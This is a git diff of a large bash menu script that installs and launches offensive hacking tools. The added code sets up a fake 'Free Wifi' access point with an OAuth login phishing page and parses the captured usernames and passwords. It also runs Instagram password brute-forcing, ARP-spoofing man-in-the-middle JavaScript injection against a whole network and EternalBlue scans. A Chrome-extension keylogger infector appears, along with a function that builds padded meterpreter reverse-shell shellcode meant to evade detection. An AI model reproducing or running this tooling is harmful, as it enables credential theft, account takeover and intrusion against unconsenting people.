@@ -3102,6 +3310,12 @@ function wifi_tools
 	else
 		echo -e ""$RS"29"$CE") "$RS"secHub"$CE"                Security/Hacking Kit"
 	fi
+	if [[ -d /root/SocialFish ]]
+	then
+		echo -e ""$YS"30"$CE") SocialFish            Ultimate phishing tool with Ngrok integrated"
+	else
+		echo -e ""$RS"30"$CE") "$RS"SocialFish"$CE"            Ultimate phishing tool with Ngrok integrated"
+	fi
 	echo -e ""$YS" b"$CE") Go back"
 	echo -e ""$YS"00"$CE") Main menu"
 	#echo -e ""$YS" 0"$CE") EXIT"
@@ -3113,7 +3327,13 @@ function wifi_tools
 		if [[ -d /root/fluxion ]]
 		then
 			cd /root/fluxion
-			./fluxion
+			#~ if [[ -f /root/fluxion/fluxion ]]
+			#~ then
+				./fluxion*
+			#~ elif [[ -f /root/fluxion/fluxion.sh ]]
+			#~ then
+				#~ ./fluxion.sh
+			#~ fi
 			cd
 		else
 			echo -e "$TNI"
@@ -3144,22 +3364,8 @@ function wifi_tools
 	then
 		if [[ -d /root/wifiphisher ]]
 		then
-			echo -e "Do you have 1 or 2 wireless interfaces?: "
-			read ONEORTWO
-			if [[ "$ONEORTWO" = "1" ]]
-			then
-				clear
-				echo -e "Note that with only 1 wireless interface, wifiphisher doesn't deauthenticate the AP."
-				sleep 1
-				echo -e ""
-				echo -e "$PAKTC"
-				$READAK
-				clear
-				wifiphisher -nJ
-			else
-				clear
-				wifiphisher
-			fi
+			clear
+			wifiphisher
 		else
 			echo -e "$TNI"
 			read INSTALL
@@ -3648,6 +3854,23 @@ function wifi_tools
 			fi
 		fi
 		cd
+	elif [[ "$APPP" = "30" ]]
+	then
+		if [[ -d "/root/SocialFish" ]]
+		then
+			cd /root/SocialFish
+			python SocialFish.py
+		else
+			echo -e "$TNI"
+			read INSTALL
+			if [[ "$INSTALL" = "install" ]]
+			then
+				install_socialfish
+			else
+				continue
+			fi
+		fi
+		cd
 	elif [[ "$APPP" = "7" ]]
 	then
 		if [[ -d "/root/hakkuframework" ]]
@@ -3902,6 +4125,36 @@ function remote_access
 		echo -e ""$YS"26"$CE") Evil-Droid            Penetrate android platforms"
 	else
 		echo -e ""$RS"26"$CE") "$RS"Evil-Droid"$CE"             Penetrate android platforms"
+	fi
+	if [[ -d /root/EggShell ]]
+	then
+		echo -e ""$YS"27"$CE") EggShell              Penetrate android platforms"
+	else
+		echo -e ""$RS"27"$CE") "$RS"EggShell"$CE"               Penetrate android platforms"
+	fi
+	if [[ -d /root/Zerodoor ]]
+	then
+		echo -e ""$YS"28"$CE") Zerodoor              Penetrate android platforms"
+	else
+		echo -e ""$RS"28"$CE") "$RS"Zerodoor"$CE"               Penetrate android platforms"
+	fi
+	if [[ -d /root/cromos ]]
+	then
+		echo -e ""$YS"29"$CE") Cromos                Download and Inject code into Google Chrome extensions"
+	else
+		echo -e ""$RS"29"$CE") "$RS"Cromos"$CE"                 Download and Inject code into Google Chrome extensions"
+	fi
+	if [[ -d /root/AutoSploit ]]
+	then
+		echo -e ""$YS"30"$CE") AutoSploit            Automated Mass Exploiter"
+	else
+		echo -e ""$RS"30"$CE") "$RS"AutoSploit"$CE"             Automated Mass Exploiter"
+	fi
+	if [[ -d /root/Enigma ]]
+	then
+		echo -e ""$YS"31"$CE") Enigma                Multiplatform payload dropper"
+	else
+		echo -e ""$RS"31"$CE") "$RS"Enigma"$CE"                 Multiplatform payload dropper"
 	fi
 	echo -e ""$YS" b"$CE") Go back"
 	echo -e ""$YS"00"$CE") Main menu"
@@ -4593,6 +4846,86 @@ function remote_access
 				continue
 			fi
 		fi
+	elif [[ "$KEYLOG" = "27" ]]
+	then
+		if [[ -d /root/EggShell ]]
+		then
+			cd /root/EggShell
+			python eggshell.py
+		else	
+			echo -e "$TNI"
+			read INSTALL
+			if [[ "$INSTALL" = "install" ]]
+			then
+				install_eggshell
+			else
+				continue
+			fi
+		fi
+	elif [[ "$KEYLOG" = "28" ]]
+	then
+		if [[ -d /root/Zerodoor ]]
+		then
+			cd /root/Zerodoor
+			python zerodoor.py
+		else	
+			echo -e "$TNI"
+			read INSTALL
+			if [[ "$INSTALL" = "install" ]]
+			then
+				install_zerodoor
+			else
+				continue
+			fi
+		fi
+	elif [[ "$KEYLOG" = "29" ]]
+	then
+		if [[ -d /root/cromos ]]
+		then
+			cd /root/cromos
+			cromos_menu
+		else	
+			echo -e "$TNI"
+			read INSTALL
+			if [[ "$INSTALL" = "install" ]]
+			then
+				install_cromos
+			else
+				continue
+			fi
+		fi
+	elif [[ "$KEYLOG" = "30" ]]
+	then
+		if [[ -d /root/AutoSploit ]]
+		then
+			cd /root/AutoSploit
+			python autosploit.py
+		else	
+			echo -e "$TNI"
+			read INSTALL
+			if [[ "$INSTALL" = "install" ]]
+			then
+				install_autosploit
+			else
+				continue
+			fi
+		fi
+	elif [[ "$KEYLOG" = "31" ]]
+	then
+		if [[ -d /root/Enigma ]]
+		then
+			cd /root/Enigma
+			python enigma.py
+		else	
+			echo -e "$TNI"
+			read INSTALL
+			if [[ "$INSTALL" = "install" ]]
+			then
+				install_enigma
+			else
+				continue
+			fi
+		fi
 	elif [[ "$KEYLOG" = "8" ]]
 	then
 		if [[ -d /root/CHAOS ]]
@@ -5189,6 +5522,54 @@ function website_tools
 		else
 			echo -e ""$RS" 3"$CE") "$RS"NoSQLMap"$CE"              Automated NoSQL exploitation tool"
 		fi
+		if [[ -d /root/Yuki-Chan-The-Auto-Pentest ]]
+		then
+			echo -e ""$YS" 4"$CE") Yuki Chan             Automated Pentest Tool"
+		else
+			echo -e ""$RS" 4"$CE") "$RS"Yuki Chan"$CE"             Automated Pentest Tool"
+		fi
+		if [[ -d /root/Blazy ]]
+		then
+			echo -e ""$YS" 5"$CE") Blazy                 Login bruteforcer/tests for CSRF, Cj, Cloudflare, WAF"
+		else
+			echo -e ""$RS" 5"$CE") "$RS"Blazy"$CE"                 Login bruteforcer/tests for CSRF, Clickjacking, Cloudflare and WAF"
+		fi
+		if [[ -d /root/Striker ]]
+		then
+			echo -e ""$YS" 6"$CE") Striker               An offensive information and vulnerability scanner"
+		else
+			echo -e ""$RS" 6"$CE") "$RS"Striker"$CE"               An offensive information and vulnerability scanner"
+		fi
+		if [[ -d /root/hyprPulse ]]
+		then
+			echo -e ""$YS" 7"$CE") HyprPulse             Brute force multiple accounts at once"
+		else
+			echo -e ""$RS" 7"$CE") "$RS"HyprPulse"$CE"             Brute force multiple accounts at once"
+		fi
+		if [[ -d /root/hyprPulse ]]
+		then
+			echo -e ""$YS" 8"$CE") InstaBurst            A faster way to brute force Instagram"
+		else
+			echo -e ""$RS" 8"$CE") "$RS"InstaBurst"$CE"             A faster way to brute force Instagram"
+		fi
+		if [[ -f /usr/local/bin/instagram-py ]]
+		then
+			echo -e ""$YS" 9"$CE") Instagram-py          Brute force Instagram without password limiting"
+		else
+			echo -e ""$RS" 9"$CE") "$RS"Instagram-py"$CE"          Brute force Instagram without password limiting"
+		fi
+		if [[ -d /root/datasploit ]]
+		then
+			echo -e ""$YS"10"$CE") Datasploit            Recon on Companies, People, Phone, Bitcoin..."
+		else
+			echo -e ""$RS"10"$CE") "$RS"Datasploit"$CE"            Recon on Companies, People, Phone, Bitcoin..."
+		fi
+		if [[ -d /root/SiteBroker ]]
+		then
+			echo -e ""$YS"11"$CE") SiteBroker            Utility to penetrate and test websites"
+		else
+			echo -e ""$RS"11"$CE") "$RS"SiteBroker"$CE"            Utility to penetrate and test websites"
+		fi
 		echo -e ""$YS" b"$CE") Go back"
 		echo -e ""$YS"00"$CE") Main menu"
 		echo -e "Choose: "
@@ -5241,6 +5622,217 @@ function website_tools
 					continue
 				fi
 			fi
+		elif [[ "$WEB" = 4 ]]
+		then
+			if [[ -d /root/Yuki-Chan-The-Auto-Pentest ]]
+			then
+				cd /root/Yuki-Chan-The-Auto-Pentest
+				./yuki.sh
+				echo -e "$PAKTGB"
+				$READAK
+			else
+				echo -e "$TNI"
+				read INSTALL
+				if [[ "$INSTALL" = "install" ]]
+				then
+					install_yuki
+				else
+					continue
+				fi
+			fi
+		elif [[ "$WEB" = 5 ]]
+		then
+			if [[ -d /root/Blazy ]]
+			then
+				cd /root/Blazy
+				python blazy.py
+				echo -e "$PAKTGB"
+				$READAK
+			else
+				echo -e "$TNI"
+				read INSTALL
+				if [[ "$INSTALL" = "install" ]]
+				then
+					install_blazy
+				else
+					continue
+				fi
+			fi
+		elif [[ "$WEB" = 6 ]]
+		then
+			if [[ -d /root/Striker ]]
+			then
+				cd /root/Striker
+				python striker.py
+				echo -e "$PAKTGB"
+				$READAK
+			else
+				echo -e "$TNI"
+				read INSTALL
+				if [[ "$INSTALL" = "install" ]]
+				then
+					install_striker
+				else
+					continue
+				fi
+			fi
+		elif [[ "$WEB" = 7 ]]
+		then
+			if [[ -d /root/hyprPulse ]]
+			then
+				cd /root/hyprPulse
+				python pulsar.py
+				echo -e "$PAKTGB"
+				$READAK
+			else
+				echo -e "$TNI"
+				read INSTALL
+				if [[ "$INSTALL" = "install" ]]
+				then
+					install_hyprpulse
+				else
+					continue
+				fi
+			fi
+		elif [[ "$WEB" = 8 ]]
+		then
+			if [[ -d /root/InstaBurst ]]
+			then
+				cd /root/InstaBurst
+				python instagram.py
+				echo -e "$PAKTGB"
+				$READAK
+			else
+				echo -e "$TNI"
+				read INSTALL
+				if [[ "$INSTALL" = "install" ]]
+				then
+					install_instaburst
+				else
+					continue
+				fi
+			fi
+		elif [[ "$WEB" = 9 ]]
+		then
+			if [[ -f /usr/local/bin/instagram-py ]]
+			then
+				while true
+				do
+					clear
+					TERMINALTITLE="Instagram-py"
+					dash_calc
+					printf '\033]2;Instagram-py\a'
+					echo -e " "$YS"1"$CE") New attack"
+					echo -e " "$YS"2"$CE") Continue previous attack"
+					echo -e " "$YS"3"$CE") View cracked passwords"
+					echo -e " "$YS"4"$CE") Create configuration"
+					echo -e " "$YS"b"$CE") Go back"
+					read C
+					clear
+					if [[ "$C" == 1 ]]
+					then
+						echo -e ""$YS"Username: "$CE""
+						read USRNM
+						echo -e ""$YS"Wordlist path: "$CE""
+						read WRDLST
+						if [[ ! -f "$WRDLST" ]]
+						then
+							echo -e ""$RS"File not found"$CE""
+							sleep 2
+							continue
+						fi
+						instagram-py -vvv -u "$USRNM" -pl "$WRDLST"
+						echo -e "$PAKTGB"
+						$READAK
+					elif [[ "$C" == 2 ]]
+					then
+						echo -e ""$YS"Username: "$CE""
+						read USRNM
+						echo -e ""$YS"Wordlist path: "$CE""
+						read WRDLST
+						if [[ ! -f "$WRDLST" ]]
+						then
+							echo -e ""$RS"File not found"$CE""
+							sleep 2
+							continue
+						fi
+						instagram-py -vvv -c -u "$USRNM" -pl "$WRDLST"
+						echo -e "$PAKTGB"
+						$READAK
+					elif [[ "$C" == 3 ]]
+					then
+						echo -e ""$YS"Username: "$CE""
+						read USRNM
+						instagram-py -i "$USRNM"
+						echo -e "$PAKTGB"
+						$READAK
+					elif [[ "$C" == 4 ]]
+					then
+						instagram-py -cc
+						echo -e "$PAKTGB"
+						$READAK
+					elif [[ "$C" == "b" || "$C" == "back" ]]
+					then
+						clear
+						break
+					elif [[ "$C" == 0 ]]
+					then
+						clear
+						exit
+					elif [[ "$C" == 00 ]]
+					then
+						exec bash $0
+					fi
+				done
+			else
+				echo -e "$TNI"
+				read INSTALL
+				if [[ "$INSTALL" = "install" ]]
+				then
+					install_instagram-py
+				else
+					continue
+				fi
+			fi
+		elif [[ "$WEB" = 10 ]]
+		then
+			if [[ -d /root/datasploit ]]
+			then
+				echo -e ""$YS"Domain: "$CE""
+				read DMN
+				cd /root/datasploit
+				python datasploit.py -i "$DMN"
+				echo -e "$PAKTGB"
+				$READAK
+			else
+				echo -e "$TNI"
+				read INSTALL
+				if [[ "$INSTALL" = "install" ]]
+				then
+					install_datasploit
+				else
+					continue
+				fi
+			fi
+		elif [[ "$WEB" = 11 ]]
+		then
+			if [[ -d /root/SiteBroker ]]
+			then
+				cd /root/SiteBroker
+				python SiteBroker.py
+				echo -e "$PAKTGB"
+				$READAK
+			else
+				echo -e "$TNI"
+				read INSTALL
+				if [[ "$INSTALL" = "install" ]]
+				then
+					install_sitebroker
+				else
+					continue
+				fi
+			fi
+
 		elif [[ "$WEB" = "" ]]
 		then
 			continue
@@ -5805,7 +6397,6 @@ function hidden_shortcuts
 	echo -e ""$YS"      astop"$CE") Service apache2 stop"
 	echo -e ""$YS"nessusstart"$CE") Start Nessus"
 	echo -e ""$YS" nessusstop"$CE") Stop Nessus"
-	echo -e ""$YS"         00"$CE") Go to main menu"
 	echo -e "$PAKTGB"
 	$READAK
 	clear
@@ -5894,7 +6485,9 @@ function tools_menu
 			other_tools
 		elif [[ "$CATEG" = "6" ]]
 		then
+			NOCONFIRM=0
 			reinstall_tools
+			NOCONFIRM=0
 		elif [[ "$CATEG" = "0" ]]
 		then
 			clear
@@ -6039,6 +6632,7 @@ function eternalblue_check
 	echo "use auxiliary/scanner/smb/smb_ms17_010" > "$LPATH"/rce/eternalbluerc.rc
 	echo "set RHOSTS "$RHOSTL"" >> "$LPATH"/rce/eternalbluerc.rc
 	echo "exploit" >> "$LPATH"/rce/eternalbluerc.rc
+	echo -e ""$BS"Launching msfconsole. Please wait..."$CE""
 	msfconsole -r "$LPATH"/rce/eternalbluerc.rc
 	
 }
@@ -6337,12 +6931,180 @@ function check_if_ks
 		var1=$(( var1+1 ))
 	done
 }
+function wififb_attack
+{
+	
+	while true
+	do
+		clear
+		TERMINALTITLE="WIFIFB-MENU"
+		dash_calc
+		printf '\033]2;WIFIFB-MENU\a'	
+		echo -e ""$YS" 1"$CE") Start attack ("$BS"always end the attack with ESC"$CE")"
+		echo -e ""$YS" 2"$CE") Check & save new passwords ("$BS"do it at the end of the attack"$CE")"
+		echo -e ""$YS" 3"$CE") Show all-saved-passwords"
+		echo -e ""$YS" 4"$CE") Copy all-saved-passwords file to desktop"
+		echo -e ""$YS" 5"$CE") Delete the all-saved-passwords file"
+		echo -e ""$YS" 6"$CE") Fix no wifi issue after the attack"
+		echo -e ""$YS" b"$CE") Go back"
+		echo -e "Choose:"
+		read wifimenu
+		clear
+		if [[ "$wifimenu" == 1 ]]
+		then
+			wififb
+		elif [[ "$wifimenu" == 2 ]]
+		then
+			wififb_pass
+			echo -e "$PAKTGB"
+			$READAK
+		elif [[ "$wifimenu" == 3 ]]
+		then
+			if [[ -f $wififbpassfileall ]]
+			then
+				cat $wififbpassfileall
+			else
+				echo -e ""$RS"File not found. Get some paswords first."$CE""
+			fi
+			echo -e "$PAKTGB"
+			$READAK
+		elif [[ "$wifimenu" == 4 ]]
+		then
+			cp $wififbpassfileall /root/Desktop/all-saved-passwords.txt && echo -e "Done"
+		elif [[ "$wifimenu" == 5 ]]
+		then
+			rm $wififbpassfileall && echo -e "Done"
+		elif [[ "$wifimenu" == 6 ]]
+		then
+			nmcli n on
+			echo -e "Error fixed, you may need to restart your system"
+			echo -e "$PAKTGB"
+			$READAK
+		elif [[ "$wifimenu" == 'b' || "$wifimenu" == "back" || "$wifimenu" == 00 ]]
+		then
+			exec bash $0
+		fi
+	done
+}
 function wififb
 {
-	echo -e "Enter the name of the access point you want to create: "
-	read -e ESSIDAP
+	echo -e "Access point's name: "
+	echo -e " "$YS"1"$CE") Free Wifi"
+	echo -e " "$YS"2"$CE") FREE WIFI"
+	echo -e " "$YS"3"$CE") Wifi Hotspot"
+	echo -e " "$YS"4"$CE") WIFI HOTSPOT"
+	echo -e " "$YS"5"$CE") Hotspot"
+	echo -e " "$YS"6"$CE") Android Hotspot"
+	echo -e " "$YS"7"$CE") Cafe Wifi"
+	echo -e " "$YS"8"$CE") Public Wifi"
+	echo -e " "$YS"9"$CE") PUBLIC WIFI"
+	echo -e ""$YS"10"$CE") Free Public Wifi"
+	echo -e ""$YS"11"$CE") FREE PUBLIC WIFI"
+	echo -e " "$YS"c"$CE") Custom name"
+	echo -e " "$YS"b"$CE") Go back"
+	read wifiind
+	if [[ "$wifiind" == 1 ]]
+	then
+		wifiname="Free Wifi"
+	elif [[ "$wifiind" == 2 ]]
+	then
+		wifiname="FREE WIFI"
+	
+	elif [[ "$wifiind" == 3 ]]
+	then
+		wifiname="Wifi Hotspot"
+	
+	elif [[ "$wifiind" == 4 ]]
+	then
+		wifiname="WIFI HOTSPOT"
+	
+	elif [[ "$wifiind" == 5 ]]
+	then
+		wifiname="Hotspot"
+	
+	elif [[ "$wifiind" == 6 ]]
+	then
+		wifiname="Android Hotspot"
+	
+	elif [[ "$wifiind" == 7 ]]
+	then
+		wifiname="Cafe Wifi"
+	
+	elif [[ "$wifiind" == 8 ]]
+	then
+		wifiname="Public Wifi"
+	
+	elif [[ "$wifiind" == 9 ]]
+	then
+		wifiname="PUBLIC WIFI"
+	
+	elif [[ "$wifiind" == 10 ]]
+	then
+		wifiname="Free Public Wifi"
+	
+	elif [[ "$wifiind" == 11 ]]
+	then
+		wifiname="FREE PUBLIC WIFI"
+	
+	elif [[ "$wifiind" == 'c' ]]
+	then
+		clear
+		echo -e "Custom access point name:"
+		read wifiname
+	elif [[ "$wifiind" == 'b' || "$wifiind" == 'back' ]]
+	then
+		wififb_attack
+	fi
+	ESSIDAP=$wifiname
 	export ESSIDAP
-	xterm -hold -geometry 90x60+9999+999999 -e bash -c 'printf "\033]2;WIFI FB TRAP\a" && wifiphisher --nojamming --essid "$ESSIDAP" -p oauth-login; exec bash' & disown 
+	export wififbfile
+	xterm -hold -geometry 160x60+9999+999999 -e bash -c 'printf "\033]2;WIFI FB TRAP\a" && wifiphisher --noextensions --essid "$ESSIDAP" -p oauth-login -kB --logging | tee $wififbfile; exec bash' & disown 
+}
+function wififb_pass
+{
+	if [[ -f $wififbfile ]]
+	then
+		##findhowmanylines
+		lines=$(cat $wififbfile | awk 'END{print NR}')
+		n=1
+		z=0
+		while [[ "$n" -le "$lines" ]]
+		do
+			USERNAME=""
+			PASS=""
+			USERNAME=$(cat $wififbfile | awk  -v nn="$n" '{if(NR==nn && /wfphshr-email=/)print}' | awk -F "email=" {'print $2'} | cut -d '&' -f1)
+			if [[ ! "$USERNAME" == "" ]]
+			then
+				z=$((z+1))
+				PASS=$(cat $wififbfile | awk  -v nn="$n" '{if(NR==nn && /word=/)print}' | awk -F "word=" {'print $2'} | cut -d '' -f1)
+				if [[ "$PASS" == "" ]]
+				then
+					PASS="No password found"
+				fi
+				echo -e ""$USERNAME":"$PASS"" >> $wififbpassfile
+			fi
+			USERNAME=""
+			PASS=""
+			n=$((n+1))
+		done
+		if [[ "$z" == 0 ]]
+		then
+			echo -e "No usernames or passwords found" >> $wififbpassfile
+		fi
+		echo -e "----------------------------------------------------------------" >> $wififbpassfile
+		cat $wififbpassfile
+		if [[ ! "$z" == 0 ]]
+		then
+			cat $wififbpassfile >> $wififbpassfileall
+			cat $wififbfile >> $wififbfileall
+			echo -e "New usernames/passwords moved to all-saved-passwords file"
+		fi
+		echo -e "" > $wififbpassfile
+		echo -e "" > $wififbfile
+	else
+		echo -e ""$RS"$wififbfile not found."$CE""
+		sleep 3
+	fi
 }
 function sqlmap_menu
 {
@@ -6840,6 +7602,90 @@ do
 				SC=""
 	fi	
 done
+}
+function cromos_menu
+{
+	if [[ ! -d /root/cromos ]]
+	then
+		echo -e ""$RS"Cromos directory was not found on /root"$CE""
+		echo -e ""$RS"Fix this issue by installing it within lscript"$CE""
+		echo -e "$PAKTGB"
+		$READAK
+	else
+		cd /root/cromos
+		while true
+		do
+			clear
+			TERMINALTITLE="CROMOS MENU"
+			dash_calc
+			printf '\033]2;CROMOS MENU\a'
+			if [[ "$CEX" == "" ]]
+			then
+				CEX="None"
+			fi
+			if [[ "$CMOD" == "" ]]
+			then
+				CMOD="keylogger"
+			fi
+			echo -e " Current extension: "$RS"$CEX"$CE""
+			echo -e " "$YS"1"$CE") Download/select an extension"
+			echo -e " "$YS"2"$CE") Choose module                     "$YS"$CMOD"$CE""
+			echo -e " "$YS"3"$CE") Infect"
+			echo -e " "$YS"4"$CE") Build"
+			echo -e " "$YS"5"$CE") Upload to dropbox"
+			echo -e " "$YS"b"$CE") Go back"
+			echo -e " "$YS"0"$CE") Exit"
+			echo -e "Choose: "
+			read CROM
+			clear
+			if [[ "$CROM" == 1 ]]
+			then
+				echo -e "Extension ID: "
+				read EXID
+				python cromos.py --extension "$EXID" && CEX=""$YS"$EXID"$CE""
+				sleep 2
+			elif [[ "$CROM" == 2 ]]
+			then
+				if [[ "$CMOD" == "keylogger" ]]
+				then
+					CMOD="currency"
+				else
+					CMOD="keylogger"
+				fi
+			elif [[ "$CROM" == 3 ]]
+			then
+				python cromos.py --extension "$EXID" --load "$CMOD"
+				sleep 2
+			elif [[ "$CROM" == 4 ]]
+			then
+				echo -e "File type to build to("$YS"Enter"$CE"="$YS"bat"$CE"):"
+				read buildext
+				if [[ "$buildext" == "" ]]
+				then
+					buildext="bat"
+				fi
+				python cromos.py --extension "$EXID" --build "$buildext" && xdg-open /root/cromos/output/builds
+				echo -e "$PAKTGB"
+				$READAK
+			elif [[ "$CROM" == 5 ]]
+			then
+				echo -e "Token: "
+				read CTOK
+				python cromos.py --extension "$EXID" --token "$CTOK"
+				echo -e "$PAKTGB"
+				$READAK
+			elif [[ "$CROM" == "b" || "$CROM" == "back" ]]
+			then
+				break
+			elif [[ "$CROM" == 0 ]]
+			then
+				exit
+			elif [[ "$CROM" == 00 ]]
+			then
+				exec bach $0
+			fi
+		done
+	fi
 }
 function mitmf_hook
 {
@@ -7628,7 +8474,7 @@ do
 	IPF=$1
 	#passing mode if any  (1=choosable   2=only rescanable)
 	#Mode 1 is for choosing and returning the IP.
-	#Mode 2 is for echoing the scan, no choosing.
+	#Mode 2 is for echoing the scan, not choosing.
 	MODE=$2
 	export IPF
 	if [[ "$IPF" = "" ]]
@@ -7643,29 +8489,25 @@ do
 	ZERO=$(give_ip_take_zero $LLL)
 	export ZERO
 	echo -e ""$BS"Scanning, please wait..."$CE""
-	tempfile=""$LPATH"/tempscan.txt"
-	xterm -geometry 1x1+9999+999999 -e "arp-scan -I "$IPF" "$ZERO"/24 | tee "$tempfile""
+	tempfile="/root/lscript/tempscan.txt"
+	xterm -geometry 1x1+9999+999999 -e "arp-scan -I "$IPF" "$ZERO"/24 | tee $tempfile"
+	#gnome-terminal -- arp-scan -I "$IPF" "$ZERO"/24 | tee $tempfile
 	clear
 	######
-	T1=$(cat "$tempfile" | grep "Ending arp-scan")
+	T1=$(cat $tempfile | grep "Ending arp-scan")
 	if [[ "$T1" = "" ]]
 	then
-		#Sould rescan
-		#~ echo -e ""$RS"Common error, retrying..."$CE""
-		#~ sleep 2
-		#~ clear
-		#~ continue
 		lines=$(cat $tempfile | awk 'END{print NR}')
 		hosts=$((lines-3))
 	else
 		lines=$(cat $tempfile | awk 'END{print NR}')
 		hosts=$((lines-5))
 	fi
+	hostsbackup="$hosts"
 		if [[ "$hosts" -le 0 ]]
 		then
 			echo -e ""$RS"No hosts found"$CE""
-			sleep 2
-			break
+			sleep 1
 		else
 			echo -e ""$BS"Host(s) found:"$CE""
 			##########
@@ -7723,6 +8565,7 @@ do
 					#~ echo "$OUTPUT"
 				fi
 			else
+				echo -e ""$YS" e"$CE") Check eternalblue exploit on IPs"
 				echo -e ""$YS" r"$CE") Rescan"
 				echo -e "Press "$YS"any other key"$CE" to go back"
 				read -n 1 ko
@@ -7730,6 +8573,33 @@ do
 				then
 					clear
 					continue
+				elif [[ "$ko" = "e" ]]
+				then
+					n=1
+					totalhosts=""
+					while [[ "$n" -le "$hostsbackup" ]]
+					do
+						totalhosts=""$totalhosts" "${host["$n"]}""
+						n=$((n+1))
+					done
+					clear
+					if [[ "$totalhosts" = "" || "$totalhosts" = " " ]]
+					then
+						echo -e ""$RS"No hosts found to check"$CE""
+						sleep 2
+						continue
+					fi
+					echo -e ""$BS"RHOSTS"$CE" <- "$totalhosts""
+					sleep 2
+					if [[ ! -d "$LPATH"/rce ]]
+					then
+						mkdir	"$LPATH"/rce
+					fi
+					echo "use auxiliary/scanner/smb/smb_ms17_010" > "$LPATH"/rce/eternalbluerc.rc
+					echo "set RHOSTS "$totalhosts"" >> "$LPATH"/rce/eternalbluerc.rc
+					echo "exploit" >> "$LPATH"/rce/eternalbluerc.rc
+					echo -e ""$BS"Launching msfconsole. Please wait..."$CE""
+					msfconsole -r "$LPATH"/rce/eternalbluerc.rc
 				else
 					BACKL=1
 					break
@@ -7745,7 +8615,7 @@ done
 }
 function browser_exploiting
 {
-	if [[ ! -f /usr/bin/arp-scan ]]
+	if [[ ! -f /usr/bin/arp-scan && ! -f /usr/sbin/arp-scan ]]
 	then
 		echo -e ""$BS"Installing arp-scan"$CE""
 		install_arp_scan
@@ -7875,7 +8745,7 @@ function browser_exploiting
 				then
 					echo -e ""$RS"Could not find the issue"$CE""
 				else
-					kill "$HT" && echo -e ""$YS"Fixed"$CE""
+					kill $HT && echo -e ""$YS"Fixed"$CE""
 				fi
 				echo -e ""
 				echo -e "$PAKTGB"
@@ -7920,6 +8790,7 @@ function browser_exploiting
 					printf '\033]2;SELECT TARGET\a'
 					echo -e ""$YS" 1"$CE") Scan and choose"
 					echo -e ""$YS" 2"$CE") Type target's IP"
+						echo -e ""$YS" 3"$CE") Target the whole network"
 					echo -e ""$YS" b"$CE") Go back"
 					echo -e "Choose: "
 					read TARR
@@ -7939,6 +8810,7 @@ function browser_exploiting
 						else
 							tarer=1
 						fi
+						wholenetwork=0
 						break
 					elif [[ "$TARR" = 2 ]]
 					then
@@ -7954,6 +8826,13 @@ function browser_exploiting
 							tarer=1
 							sleep 2
 						fi
+						wholenetwork=0
+						break
+					elif [[ "$TARR" = 3 ]]
+					then	
+						TAR="EVERYONE"
+						tarer=0
+						wholenetwork=1
 						break
 					fi
 				done
@@ -8000,7 +8879,12 @@ function browser_exploiting
 							export mitmfhook
 							cd /root/MITMf
 							clear
-							xterm -hold -T "MITMf" -geometry 80x15+9999+9999 -e "python mitmf.py -i "$mitmfint" --spoof --arp --gateway "$mitmfgate" --target "$TAR" --hsts --inject --js-url "$mitmfhook" && echo -e '' && echo -e 'Close this window manually'"  & disown
+							if [[ "$wholenetwork" == 0 ]]
+							then
+								xterm -hold -T "MITMf" -geometry 80x15+9999+9999 -e "python mitmf.py -i "$mitmfint" --spoof --arp --gateway "$mitmfgate" --target "$TAR" --hsts --inject --js-url "$mitmfhook" && echo -e '' && echo -e 'Close this window manually'"  & disown
+							else
+								xterm -hold -T "MITMf" -geometry 80x15+9999+9999 -e "python mitmf.py -i "$mitmfint" --spoof --arp --gateway "$mitmfgate" --hsts --inject --js-url "$mitmfhook" && echo -e '' && echo -e 'Close this window manually'"  & disown
+							fi
 							cd
 						else
 							echo -e ""$RS"ERROR 4. Could not find gateway. Make sure you are connected to a network on interface "$SINT""$CE""
@@ -8337,14 +9221,52 @@ function settings_menu
 		fi
 	done
 }
+function undetectable1
+{
+	LHOST=192.168.1.104
+	LPORT=4444
+	DIRECTORY="/root/Desktop/shellcode.txt"
+	TXT="/root/Desktop/txt.txt"
+	#############
+	randomshit=$(cat /dev/urandom | tr -dc a-z-A-Z-0-9 | head -c1409)
+	msfvenom -p windows/meterpreter/reverse_tcp LHOST="$LHOST" LPORT="$LPORT" -f c -o "$DIRECTORY"
+	echo "unsigned char padding[]=" > "$TXT"
+	echo "\"$randomshit\";" >> "$TXT"
+	cat "$DIRECTORY" >> "$TXT"
+	echo "int main(void) { ((void (*)())buf)();}" >> "$TXT"
+	leafpad "$TXT"
+}
 function main_options
 {
 	if [[ "$YORNAA" = "0" ]]
 	then
 		exit
+	elif [[ "$YORNAA" = "gate" || "$YORNAA" = "gateway" ]]
+	then
+		TT=$(ifconfig | grep "$WLANN")
+		if [[ "$TT" = "" ]]
+		then
+			echo -e ""$RS""$WLANN" is not available"$CE""
+			sleep 2
+		else
+			GATE=$(find_gateways "$WLANN" interface)
+			TTT=$(is_it_an_ip "$GATE")
+			if [[ "$TTT" != 1 ]]
+			then
+				echo -e ""$RS"Couldn't find your gateway."$CE""
+				sleep 2
+				echo -e ""$RS"Make sure you are connected to a network"$CE""
+				sleep 2
+			else
+				echo -e ""$YS"Gateway found: "$GATE""$CE""
+				sleep 1
+				xdg-open http://"$GATE"
+				BACKL=1
+			fi
+		fi
 	elif [[ "$YORNAA" = "scan" ]]
 	then
-		if [[ ! -f /usr/bin/arp-scan ]]
+		if [[ ! -f /usr/bin/arp-scan && ! -f /usr/sbin/arp-scan ]]
 		then
 			echo -e ""$BS"Installing arp-scan"$CE""
 			install_arp_scan
@@ -8372,6 +9294,11 @@ function main_options
 		fi
 	elif [[ "$YORNAA" = "22" ]]
 	then
+		IFTOPT=$(which iftop)
+		if [[ "$IFTOPT" == "" ]]
+		then
+			apt-get -y install iftop
+		fi
 		CHECK=$(ifconfig | grep "$iftopint")
 		if [[ "$CHECK" = "" ]]
 		then
@@ -8755,7 +9682,7 @@ function main_options
 	then
 		if [[ -d /root/wifiphisher ]]
 		then
-			wififb
+			wififb_attack
 		else
 			echo -e ""$RS"Wifiphisher is not installed.Type '"$CE""$YS"install"$CE""$RS"' to install it."$CE""
 			read INSTALL
@@ -8781,23 +9708,63 @@ var1=1
 check_if_ks
 ####
 }
+
 #----------------TOOLS---------------
+	function install_default
+	{
+		if [[ "$foldname" == "" ]]
+		then
+			testgit=$(echo "$gitlink" | grep ".git")
+			if [[ "$testgit" == "" ]]
+			then
+				foldname=$(echo "$gitlink" | cut -d '/' -f5)
+			else
+				foldname=$(echo "$gitlink" | cut -d '/' -f2 | cut -d '.' -f1)
+			fi
+		fi
+		if [[ -d "/root/"$foldname"" ]]
+		then
+			if [[ "$NOCONFIRM" == 1 ]]
+			then
